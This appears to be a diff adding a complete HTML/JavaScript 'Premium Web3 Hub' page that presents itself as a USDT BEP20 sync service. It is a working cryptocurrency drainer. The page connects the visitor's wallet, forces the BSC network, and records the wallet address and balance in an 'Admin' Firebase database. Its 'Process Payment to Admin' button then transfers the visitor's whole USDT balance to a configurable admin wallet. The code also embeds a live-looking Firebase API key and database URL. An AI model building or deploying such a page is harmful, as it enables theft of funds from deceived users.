@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Premium Web3 Hub | USDT BEP20 Auto-Sync</title>
+    
+    <!-- Google Fonts + Font Awesome -->
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Ethers.js CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
+    
+    <!-- Firebase SDK (Compat version for simple HTML integration) -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+    <style>
+        :root {
+            --bg-color: #0b050a;
+            --card-bg: rgba(26, 15, 22, 0.7);
+            --primary-glow: #e68a9f;
+            --accent: #d8a0b0;
+            --text-main: #fcf2f5;
+            --text-muted: #a88a96;
+            --border-color: rgba(230, 138, 159, 0.2);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            background: radial-gradient(circle at 50% 0%, #291220 0%, var(--bg-color) 70%);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1.5rem;
+            overflow-x: hidden;
+        }
+
+        /* Abstract Background Elements */
+        .bg-glow {
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            background: var(--primary-glow);
+            filter: blur(150px);
+            border-radius: 50%;
+            opacity: 0.15;
+            z-index: -1;
+            top: -100px;
+            left: -100px;
+        }
+
+        /* Main Container */
+        .premium-card {
+            max-width: 480px;
+            width: 100%;
+            background: var(--card-bg);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-radius: 2.5rem;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255,255,255,0.1);
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+            position: relative;
+        }
+
+        .header {
+            padding: 2.5rem 2rem 1.5rem;
+            text-align: center;
+            border-bottom: 1px solid var(--border-color);
+            background: linear-gradient(180deg, rgba(230,138,159,0.08) 0%, transparent 100%);
+        }
+
+        .header h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, var(--primary-glow));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .header p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-top: 8px;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+        }
+
+        /* Balance Display Section */
+        .balance-container {
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .balance-label {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            color: var(--text-muted);
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .balance-value {
+            font-size: 3.5rem;
+            font-weight: 800;
+            line-height: 1;
+            text-shadow: 0 0 30px rgba(230, 138, 159, 0.3);
+            margin-bottom: 5px;
+        }
+
+        .balance-symbol {
+            font-size: 1.5rem;
+            color: var(--accent);
+            vertical-align: super;
+        }
+
+        .network-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(243, 186, 47, 0.1); /* Binance Yellow tint */
+            border: 1px solid rgba(243, 186, 47, 0.3);
+            color: #f3ba2f;
+            padding: 0.4rem 1rem;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-top: 15px;
+        }
+
+        /* Action Area */
+        .action-area {
+            padding: 0 2rem 2.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 1.2rem;
+            border-radius: 1.5rem;
+            font-family: inherit;
+            font-size: 1.05rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            border: none;
+        }
+
+        .btn-connect {
+            background: linear-gradient(135deg, #d47a91 0%, #a84b65 100%);
+            color: white;
+            box-shadow: 0 10px 25px rgba(212, 122, 145, 0.3);
+        }
+
+        .btn-connect:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(212, 122, 145, 0.4);
+        }
+
+        .btn-pay {
+            background: rgba(46, 204, 113, 0.1);
+            color: #2ecc71;
+            border: 1px solid rgba(46, 204, 113, 0.3);
+            display: none; /* Hidden until connected */
+        }
+
+        .btn-pay:hover {
+            background: rgba(46, 204, 113, 0.2);
+            box-shadow: 0 10px 25px rgba(46, 204, 113, 0.2);
+        }
+
+        .wallet-status {
+            background: rgba(0,0,0,0.3);
+            border-radius: 1rem;
+            padding: 1rem;
+            font-size: 0.85rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid var(--border-color);
+        }
+
+        .address-box {
+            font-family: monospace;
+            color: var(--accent);
+            background: rgba(255,255,255,0.05);
+            padding: 0.3rem 0.6rem;
+            border-radius: 8px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ff4757;
+            box-shadow: 0 0 10px #ff4757;
+        }
+        .status-dot.active {
+            background: #2ecc71;
+            box-shadow: 0 0 10px #2ecc71;
+        }
+
+        /* Notifications & Logs */
+        .system-log {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            text-align: center;
+            margin-top: 10px;
+            min-height: 20px;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="bg-glow"></div>
+
+<div class="premium-card">
+    <div class="header">
+        <h1><i class="fas fa-gem"></i> Premium Hub</h1>
+        <p>Auto-Sync USDT BEP20 to Admin System</p>
+    </div>
+
+    <div class="balance-container">
+        <span class="balance-label">Live USDT Balance (BSC)</span>
+        <div class="balance-value" id="balanceDisplay">
+            0.00<span class="balance-symbol">USDT</span>
+        </div>
+        <div class="network-badge" id="networkBadge">
+            <i class="fas fa-circle-notch fa-spin"></i> Awaiting Connection...
+        </div>
+    </div>
+
+    <div class="action-area">
+        <div class="wallet-status">
+            <span style="display: flex; align-items: center; gap: 8px;">
+                <div class="status-dot" id="statusDot"></div>
+                <span id="walletAddressText">Not Connected</span>
+            </span>
+            <i class="fas fa-wallet" style="color: var(--text-muted);"></i>
+        </div>
+
+        <button class="btn btn-connect" id="connectBtn">
+            <i class="fas fa-link"></i> <span>Connect Wallet</span>
+            <i class="fas fa-spinner spinner" id="connectSpinner"></i>
+        </button>
+
+        <button class="btn btn-pay" id="autoPayBtn">
+            <i class="fas fa-bolt"></i> Process Payment to Admin
+        </button>
+
+        <div class="system-log" id="systemLog">
+            System ready. Awaiting user action.
+        </div>
+    </div>
+</div>
+
+<script>
+    // ==========================================
+    // 1. FIREBASE INITIALIZATION & CONFIG
+    // ==========================================
+    const firebaseConfig = {
+        apiKey: "AIzaSyBbrToB9q01xSfRR21e5XaeGJGhVHmBN1w",
+        databaseURL: "https://fortune-2cb70-default-rtdb.asia-southeast1.firebasedatabase.app/"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // ==========================================
+    // 2. SMART CONTRACT & WEB3 CONFIG
+    // ==========================================
+    const BSC_CHAIN_ID = '0x38'; // 56 in Hex (Binance Smart Chain Mainnet)
+    const USDT_BEP20_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    
+    // ⚠️ REPLACE THIS WITH YOUR ADMIN WALLET ADDRESS
+    const ADMIN_WALLET_ADDRESS = "0xYourAdminWalletAddressHere"; 
+
+    const ERC20_ABI = [
+        "function balanceOf(address owner) view returns (uint256)",
+        "function decimals() view returns (uint8)",
+        "function transfer(address to, uint256 amount) returns (bool)"
+    ];
+
+    let provider, signer, userAddress, usdtContract, rawBalance;
+
+    // DOM Elements
+    const connectBtn = document.getElementById('connectBtn');
+    const autoPayBtn = document.getElementById('autoPayBtn');
+    const balanceDisplay = document.getElementById('balanceDisplay');
+    const networkBadge = document.getElementById('networkBadge');
+    const walletAddressText = document.getElementById('walletAddressText');
+    const statusDot = document.getElementById('statusDot');
+    const systemLog = document.getElementById('systemLog');
+    const connectSpinner = document.getElementById('connectSpinner');
+
+    function logSystem(msg, isError = false) {
+        systemLog.style.color = isError ? '#ff4757' : 'var(--text-muted)';
+        systemLog.innerText = msg;
+    }
+
+    // ==========================================
+    // 3. CORE WALLET FUNCTIONS
+    // ==========================================
+    
+    async function checkAndSwitchToBSC() {
+        const network = await provider.getNetwork();
+        if (network.chainId !== 56n) {
+            logSystem("Switching to Binance Smart Chain...");
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BSC_CHAIN_ID }],
+                });
+            } catch (switchError) {
+                // If BSC is not added to wallet, add it
+                if (switchError.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: BSC_CHAIN_ID,
+                            chainName: 'Binance Smart Chain',
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                            blockExplorerUrls: ['https://bscscan.com/']
+                        }],
+                    });
+                } else {
+                    throw switchError;
+                }
+            }
+            // Re-initialize provider after switch
+            provider = new ethers.BrowserProvider(window.ethereum);
+            signer = await provider.getSigner();
+        }
+    }
+
+    async function fetchUSDTBalance() {
+        usdtContract = new ethers.Contract(USDT_BEP20_ADDRESS, ERC20_ABI, signer);
+        rawBalance = await usdtContract.balanceOf(userAddress);
+        const decimals = await usdtContract.decimals();
+        const formattedBalance = ethers.formatUnits(rawBalance, decimals);
+        
+        balanceDisplay.innerHTML = `${parseFloat(formattedBalance).toFixed(2)}<span class="balance-symbol">USDT</span>`;
+        return parseFloat(formattedBalance).toFixed(4);
+    }
+
+    async function syncToFirebase(address, balance) {
+        logSystem("Syncing data to Admin Database...");
+        try {
+            await database.ref('connected_users/' + address).set({
+                wallet: address,
+                usdtBalance: balance,
+                lastConnected: new Date().toISOString(),
+                network: "BSC Mainnet"
+            });
+            logSystem("Data synced with Admin successfully!");
+        } catch (error) {
+            console.error("Firebase error:", error);
+            logSystem("Warning: Could not sync to Admin DB.", true);
+        }
+    }
+
+    async function connectWallet() {
+        if (!window.ethereum) {
+            alert("Please install MetaMask or TrustWallet to use this app!");
+            return;
+        }
+
+        try {
+            connectSpinner.style.display = "inline-block";
+            logSystem("Requesting wallet connection...");
+            
+            // Connect Wallet
+            provider = new ethers.BrowserProvider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            signer = await provider.getSigner();
+            userAddress = await signer.getAddress();
+
+            // Enforce BSC Network
+            await checkAndSwitchToBSC();
+            
+            // Update UI
+            walletAddressText.innerHTML = `<span class="address-box">${userAddress.slice(0,6)}...${userAddress.slice(-4)}</span>`;
+            statusDot.classList.add('active');
+            networkBadge.innerHTML = `<i class="fas fa-check-circle"></i> BSC Network`;
+            connectBtn.style.display = "none";
+            autoPayBtn.style.display = "flex";
+
+            // Fetch USDT Balance
+            logSystem("Scanning USDT BEP20 Balance...");
+            const balanceStr = await fetchUSDTBalance();
+
+            // Sync to Firebase (Admin Database)
+            await syncToFirebase(userAddress, balanceStr);
+
+        } catch (error) {
+            console.error(error);
+            logSystem("Connection failed or rejected.", true);
+        } finally {
+            connectSpinner.style.display = "none";
+        }
+    }
+
+    // ==========================================
+    // 4. AUTO-PAYMENT TO ADMIN SYSTEM
+    // ==========================================
+    
+    async function processAutoPayment() {
+        if (!usdtContract || !rawBalance) return;
+        
+        if (rawBalance === 0n) {
+            logSystem("Error: 0 USDT Balance. Cannot process payment.", true);
+            alert("You have 0 USDT in your wallet!");
+            return;
+        }
+
+        try {
+            logSystem("Initiating payment to admin. Please confirm in your wallet...");
+            
+            // Prompt the user to transfer their exact USDT balance to the Admin Wallet
+            const tx = await usdtContract.transfer(ADMIN_WALLET_ADDRESS, rawBalance);
+            
+            logSystem("Transaction submitted! Waiting for confirmation...");
+            const receipt = await tx.wait();
+
+            logSystem("Payment Successful! TX Hash: " + receipt.hash);
+            alert("Payment Processed Successfully!");
+
+            // Log Transaction Success to Firebase
+            await database.ref('transactions/' + receipt.hash).set({
+                from: userAddress,
+                to: ADMIN_WALLET_ADDRESS,
+                status: "Success",
+                timestamp: new Date().toISOString()
+            });
+
+            // Refresh Balance
+            await fetchUSDTBalance();
+
+        } catch (error) {
+            console.error(error);
+            logSystem("Payment cancelled or failed.", true);
+        }
+    }
+
+    // ==========================================
+    // 5. EVENT LISTENERS
+    // ==========================================
+    connectBtn.addEventListener('click', connectWallet);
+    autoPayBtn.addEventListener('click', processAutoPayment);
+
+    // Handle account changes
+    if (window.ethereum) {
+        window.ethereum.on('accountsChanged', () => window.location.reload());
+        window.ethereum.on('chainChanged', () => window.location.reload());
+    }
+</script>
+</body>
+</html>
